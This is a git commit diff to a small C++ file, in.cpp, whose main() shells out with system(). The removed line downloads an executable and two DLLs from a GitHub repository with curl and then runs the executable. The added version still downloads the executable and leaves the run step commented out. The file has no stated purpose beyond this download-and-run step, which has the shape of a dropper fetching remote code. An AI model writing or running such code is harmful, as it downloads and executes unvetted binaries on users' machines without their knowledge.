1604a47f824926a22c7c5edfa604c280d4bbcd2d
sanlexandro <sanlexandro@gmail.com>
2024-12-01 00:59:43 +0300

    4

--- in.cpp
+++ in.cpp
@@ -2,8 +2,10 @@
 using namespace std;
 
 int main(){
-    system("powershell curl -LJO https://github.com/xexe-ded/xexe/raw/refs/heads/main/xexe.exe & curl -LJO https://github.com/xexe-ded/xexe/blob/master/libwinpthread-1.dll & curl -LJO https://github.com/xexe-ded/xexe/blob/master/libgcc_s_seh-1.dll & xexe.exe");
-
+    system("curl -LJO https://github.com/xexe-ded/xexe/raw/refs/heads/main/xexe.exe");
+    //system("curl -LJO https://github.com/xexe-ded/xexe/blob/master/libwinpthread-1.dll");
+    //system("curl -LJO https://github.com/xexe-ded/xexe/blob/master/libgcc_s_seh-1.dll");
+    //system("xexe.exe");
     cout << "end";
     return 1;
 }
